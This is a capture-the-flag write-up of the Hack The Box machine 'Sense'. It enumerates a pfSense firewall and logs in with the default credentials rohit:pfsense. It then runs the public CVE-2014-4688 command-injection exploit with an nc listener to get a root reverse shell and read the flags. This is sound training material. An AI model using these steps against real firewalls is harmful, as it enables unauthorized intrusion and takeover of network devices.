# Sense - Easy

```sh
sudo vim /etc/hosts
# add sense.htb

nmap -T4 -p- -A -Pn -v sense.htb
```

* open ports & services:

    * 80/tcp - http - lighttpd 1.4.35
    * 443/tcp - ssl/https

* attempting to access the webpage on port 80 redirects to 'https://sense.htb' (port 443) gives us a 501 error for 'potential DNS rebind attack', and informs to access the 'router' by IP address instead of hostname

* if we access the webpage 'https://10.129.231.63', we get a login portal for 'pfSense'

* Google shows that it is an open-source firewall & router software

* we can try using default and common creds for 'pfSense', like 'admin:pfsense' and 'admin:admin', but this does not work

* web scan:

    ```sh
    gobuster dir -u https://10.129.231.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md -t 25 -k
    # dir scan

    ffuf -c -u 'https://sense.htb' -H 'Host: FUZZ.sense.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 15 -fw 868 -s
    # subdomain scan
    ```

* the ```gobuster``` scan takes a lot of time but it gives multiple pages, we can check the main ones - most of the other pages redirect to the login page /index.php:

    * /changelog.txt - this security changelog mentions there was a failure in updating the firewall, and 2 of 3 vulns have been patched; indicating that there is one more vuln
    
    * /index.html - this leads to a page with the logo for 'DragonFlyBSD', and a link to /dfuife.cgi with the text 'Begin Installation'

    * /xmlrpc.php - gives a XML file but this does not have any useful data

    * /tree - this shows the page for SilverStripe Tree Control, v0.1

    * /system-users.txt - this is a support ticket note

* in /index.html, if we click on the 'Begin Installation' link, this leads nowhere - probably the /dfuife.cgi file was removed or not found in filesystem

* also, Googling for exploits associated with SilverStripe Tree Control do not give anything, so we need to keep searching

* the /system-users.txt file is a note mentioning username 'Rohit' and password as 'company defaults'

* we can try using the usernames 'Rohit' and 'rohit' (capitalized & lowercase), against default passwords like 'admin', 'pfsense' & 'pfSense'

* the creds 'rohit:pfsense' works and we are able to login and access the dashboard page

* the dashboard page gives us a lot of info, and it also discloses the version - 2.1.3-release (amd64), freeBSD 8.3-release-p16

* Googling for exploits associated with this release gives us [CVE-2014-4688](https://www.exploit-db.com/exploits/43560) - a command injection vuln affecting pfSense versions before 2.1.4

* we can try this exploit:

    ```sh
    nc -nvlp 4444
    # setup listener

    python3 43560.py --rhost 10.129.231.71 --lhost 10.10.14.28 --lport 4444 --username rohit --password pfsense
    # the exploit fails due to 'SSLCertVerificationError'

    # edit the exploit to ignore the SSL cert verification
    vim 43560.py
    # add 'verify=False' argument in the request-response functions

    python3 43560.py --rhost 10.129.231.71 --lhost 10.10.14.28 --lport 4444 --username rohit --password pfsense
    # run the exploit again
    # this gives us shell
    ```

* in reverse shell:

    ```sh
    id
    # we are already root

    ls -la /root

    cat /root/root.txt
    # root flag

    ls -la /home
    # we have user 'rohit'

    ls -la /home/rohit

    cat /home/rohit/user.txt
    # user flag
    ```
